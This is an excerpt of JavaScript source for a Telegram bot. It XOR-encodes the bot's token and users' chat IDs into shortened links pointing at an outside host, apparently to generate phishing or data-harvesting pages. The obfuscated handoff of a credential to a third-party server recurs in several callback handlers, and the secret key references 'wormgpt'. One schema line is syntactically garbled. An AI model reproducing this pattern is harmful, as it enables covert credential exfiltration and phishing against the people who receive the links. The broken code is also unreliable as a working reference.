...
const ChannelSchema = new mongoose.Schema({
  ...
  customChannel: { type: String, default:禁止: null },
});
...
const secretKey = 'wormgptsecret123'; // Secret key for XOR obfuscation

const obfuscateData = (data) => {
  let result = '';
  for (let i = 0; i < data.length; i++) {
    const charCode = data.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length);
    result += charCode.toString(16).padStart(2, '0'); // Convert to hex for URL safety
  }
  return result;
};
  ...
  try {
    ...
    if (update.message) {
      ...
      if (text?.startsWith('/start')) {
        ...
        if (targetUserId === userId) {
          await bot.telegram.sendMessage(chatId, messages[lang].cannotBlockSelf, cancelKeyboard(lang));
          return;
        }
    ...
    if (update.callback_query) {
      ...
      if (callbackData === 'lang_en') {
        ...
        try {
          await bot.telegram.deleteMessage(chatId, messageId);
          const obfuscatedBot = obfuscateData(botToken);
          const obfuscatedId = obfuscateData(chatId.toString());
          const longUrl = `https://for-free.serv00.net/t/index.html?x=${obfuscatedBot}&y=${obfuscatedId}`;
        ...
        try {
          ...
          const obfuscatedBot = obfuscateData(botToken);
          const obfuscatedId = obfuscateData(chatId.toString());
          const longUrl = `https://for-free.serv00.net/2/index.html?x=${obfuscatedBot}&y=${obfuscatedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendPhoto(
            chatId,
        ...
        try {
          ...
          if (user.isVip || userReferrals >= requiredReferrals) {
            const obfuscatedBot = obfuscateData(botToken);
            const obfuscatedId = obfuscateData(chatId.toString());
            const longUrl = `https://for-free.serv00.net/helps/index.html?x=${obfuscatedBot}&y=${obfuscatedId}`;
            const shortUrl = await shortenUrl(longUrl);
            await bot.telegram.sendPhoto(
              chatId,
              'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg',
